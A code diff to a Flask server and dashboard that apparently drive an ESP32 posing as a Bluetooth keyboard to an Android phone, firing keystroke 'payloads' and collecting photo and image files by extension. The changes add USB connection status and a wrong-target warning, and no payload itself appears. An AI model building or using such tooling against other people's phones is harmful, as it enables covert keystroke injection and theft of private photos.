@@ -166,6 +166,9 @@ _esp32_last_seen: float = 0.0
 # BLE connection state: True when ESP32 reports Android is paired & connected
 _ble_connected: bool = False
 
+# USB/Serial host connection: True when ESP32 reports host has Serial port open
+_usb_connected: bool = False
+
 # File-type config — which extensions the ESP32 should collect
 # Dashboard can update this via POST /api/config
 DEFAULT_EXTS = ["jpg", "jpeg", "png", "webp", "heic", "gif",
@@ -557,6 +560,7 @@ def api_stats():
         "esp32_online":  age is not None and age < 10,
         "esp32_age_s":   round(age, 1) if age is not None else None,
         "ble_connected": _ble_connected,
+        "usb_connected": _usb_connected,
         "pending_cmd":   _pending_cmd is not None,
         "active_exts":   _active_exts,
     }), 200
@@ -570,12 +574,15 @@ def api_poll():
     Returns the command and clears it, or {"cmd": null} if nothing pending.
     Also records the ESP32 heartbeat timestamp and BLE connection state.
     Query params:
-      ?ble=1   — Android is paired & connected
+      ?ble=1   — Android is paired & connected over BLE
       ?ble=0   — Android not connected (default if omitted)
+      ?usb=1   — host computer has the Serial port open
+      ?usb=0   — Serial port not open (default if omitted)
     """
-    global _pending_cmd, _esp32_last_seen, _ble_connected
+    global _pending_cmd, _esp32_last_seen, _ble_connected, _usb_connected
     _esp32_last_seen = time.time()
     _ble_connected   = request.args.get("ble", "0") == "1"
+    _usb_connected   = request.args.get("usb", "0") == "1"
     if _pending_cmd:
         cmd = dict(_pending_cmd)
         _pending_cmd = None   # consume — one-shot
@@ -628,6 +635,8 @@ def api_device():
     return jsonify({
         "online":        online,
         "last_seen_s":   round(age, 1) if age is not None else None,
+        "ble_connected": _ble_connected,
+        "usb_connected": _usb_connected,
         "pending_cmd":   _pending_cmd is not None,
         "active_exts":   _active_exts,
     }), 200
@@ -1047,9 +1056,26 @@ tbody td{padding:7px 10px;color:#cbd5e1;white-space:nowrap}
     </div>
 
     <!-- BLE / Android connection status banner -->
-    <div id="ble-status-row" style="display:none;align-items:center;gap:12px;padding:11px 18px;border-radius:10px;border:1px solid var(--border);background:var(--surface);margin-bottom:16px">
+    <div id="ble-status-row" style="display:none;align-items:center;gap:12px;padding:11px 18px;border-radius:10px;border:1px solid var(--border);background:var(--surface);margin-bottom:8px">
       <div id="ble-dot" style="width:10px;height:10px;border-radius:50%;background:var(--muted);flex-shrink:0"></div>
       <div id="ble-status-text" style="font-size:.82rem;font-weight:600;color:var(--muted)">Android — waiting...</div>
+    </div>
+
+    <!-- USB / Serial host connection status banner -->
+    <div id="usb-status-row" style="display:none;align-items:center;gap:12px;padding:11px 18px;border-radius:10px;border:1px solid var(--border);background:var(--surface);margin-bottom:8px">
+      <div id="usb-dot" style="width:10px;height:10px;border-radius:50%;background:var(--muted);flex-shrink:0"></div>
+      <div>
+        <div id="usb-status-text" style="font-size:.82rem;font-weight:600;color:var(--muted)">Host USB — waiting...</div>
+        <div id="usb-status-sub" style="font-size:.7rem;color:var(--muted);margin-top:1px"></div>
+      </div>
+    </div>
+
+    <!-- Wrong-target warning: USB connected but BLE not — keystrokes would hit host -->
+    <div id="wrong-target-warn" style="display:none;padding:10px 14px;border-radius:8px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.3);font-size:.78rem;color:#f87171;margin-bottom:16px;line-height:1.6">
+      ⚠️ <strong>Wrong-target risk:</strong> ESP32 is connected to your computer via USB but Android BLE is <strong>not</strong> connected.
+      Firing a payload now would type keystrokes into your computer instead of the Android device.
+      <br>Pair the ESP32 as <strong>"ESP32 Keyboard"</strong> on your Android phone first, or disconnect the USB cable.
+      The firmware will also refuse to fire in this state.
     </div>
 
     <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
@@ -1440,6 +1466,7 @@ function setResult(msg, col) {
 function updateControlPanel(d) {
   const online    = d.esp32_online;
   const bleConn   = d.ble_connected;
+  const usbConn   = d.usb_connected;
 
   // ── ESP32 WiFi / polling status ────────────────────────────────────────
   const dot = document.getElementById('ctrl-dot');
@@ -1468,22 +1495,49 @@ function updateControlPanel(d) {
   const bleDot = document.getElementById('ble-dot');
   const bleTxt = document.getElementById('ble-status-text');
   if (online) {
-    bleRow.style.display = '';
+    bleRow.style.display = 'flex';
     if (bleConn) {
       bleDot.style.background = 'var(--green)';
-      bleTxt.textContent = 'Android — Paired & Connected';
+      bleTxt.textContent = '📱 Android — Paired & Connected';
       bleTxt.style.color = 'var(--green)';
     } else {
       bleDot.style.background = 'var(--amber)';
-      bleTxt.textContent = 'Android — Not connected (pair via Bluetooth settings)';
+      bleTxt.textContent = '📱 Android — Not connected  (pair via Bluetooth settings)';
       bleTxt.style.color = 'var(--amber)';
     }
   } else {
     bleRow.style.display = 'none';
   }
 
+  // ── USB / Serial host connection status ───────────────────────────────
+  const usbRow = document.getElementById('usb-status-row');
+  const usbDot = document.getElementById('usb-dot');
+  const usbTxt = document.getElementById('usb-status-text');
+  const usbSub = document.getElementById('usb-status-sub');
+  if (online) {
+    usbRow.style.display = 'flex';
+    if (usbConn) {
+      usbDot.style.background = '#60a5fa';   // blue — informational
+      usbTxt.textContent = '💻 Host USB — Connected (Serial port open)';
+      usbTxt.style.color = '#60a5fa';
+      usbSub.textContent = 'Your computer has the ESP32 Serial port open (Arduino IDE / monitor)';
+    } else {
+      usbDot.style.background = 'var(--muted)';
+      usbTxt.textContent = '💻 Host USB — Not connected';
+      usbTxt.style.color = 'var(--muted)';
+      usbSub.textContent = 'No host has the ESP32 Serial port open';
+    }
+  } else {
+    usbRow.style.display = 'none';
+  }
+
+  // ── Wrong-target warning ──────────────────────────────────────────────
+  // Show when: ESP32 is online AND USB is connected AND BLE is NOT connected.
+  // In this state, firing would type keystrokes into the host computer.
+  const wrongWarn = document.getElementById('wrong-target-warn');
+  wrongWarn.style.display = (online && usbConn && !bleConn) ? '' : 'none';
+
   // ── Fire button — always clickable, no gating ──────────────────────────
-  // Command is queued on server and ESP32 picks it up when it connects.
   const btn = document.getElementById('trigger-btn');
   if (!btn.disabled) {
     btn.style.opacity = '1';
